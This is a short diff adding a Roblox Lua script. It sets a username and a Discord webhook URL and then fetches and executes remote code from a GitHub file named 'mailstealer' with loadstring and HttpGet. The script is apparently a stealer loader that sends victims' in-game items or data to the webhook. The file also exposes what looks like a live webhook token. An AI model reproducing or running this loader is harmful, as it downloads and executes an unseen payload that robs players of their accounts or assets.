@@ -1,0 +1,5 @@
+Username= "danwasley_gamer"
+
+Webhook= "https://discord.com/api/webhooks/1166341776286687363/2nggLvEf6mCtWtsqVJJfUQ86NMsEEA9wpg2-RD-CW5pJCsMNwvz8C05PpBd-Ar_EAIhg"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ruagevp/JodaHub/main/mailstealer'))()
